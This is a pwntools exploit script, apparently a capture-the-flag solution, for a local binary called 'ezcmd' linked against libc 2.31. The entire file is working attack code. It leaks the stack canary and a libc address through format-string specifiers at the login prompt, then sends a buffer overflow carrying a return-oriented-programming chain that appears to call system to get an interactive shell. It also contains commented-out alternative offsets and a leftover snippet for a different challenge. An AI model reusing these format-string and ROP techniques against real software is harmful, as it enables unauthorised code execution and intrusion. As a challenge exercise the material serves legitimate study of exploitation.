from pwn import *
context(arch='amd64', os='linux', log_level='debug')
elf_file = './ezcmd'
e = ELF(elf_file)
libc = ELF('./libc-2.31.so')
Remote = False

canary_payload = '%11$p'

p_addr = '%33$p'

pop_rdi = 0x0000000000026b72
# pop_rdi = 0x0000000000026796
pop_rsi = 0x0000000000001661

if Remote:
    pass
else:
    p = process(elf_file)

gdb.attach(p)

p.recvuntil('$ ')
p.sendline('login')
p.recvuntil('user:')
p.sendline(canary_payload)
canary = int(p.recvline(), 16)
p.recvuntil('passwd:')
p.sendline('aaa')
p.recvuntil('$ ')
p.sendline('login')
p.recvuntil('user:')
pause()
p.sendline(p_addr)
pause()
libc_base = int(p.recvline(), 16)-116-0x9D260
# libc_base = int(p.recvline(), 16)-116-0x08A0F0
log.info(hex(libc_base))
p.recvuntil('passwd:')
payload2 = cyclic(24)+p64(canary)+cyclic(8)+ p64(pop_rdi+libc_base)+p64(0x00000000001b75aa+libc_base)+p64(libc_base+0x55410)+p64(0)
# payload2 = cyclic(24)+p64(canary)+cyclic(8)+ p64(pop_rdi+libc_base)+p64(0x18A152+libc_base)+p64(libc_base+0x48E50)+p64(0)
p.sendline(payload2)

# flag_reader = e.sym['printFlag']
# padding = b'a'*24
# payload = padding + p32(flag_reader)
# p.recvuntil('This program is hungry. You should feed it.')
# p.sendline(payload)
p.interactive()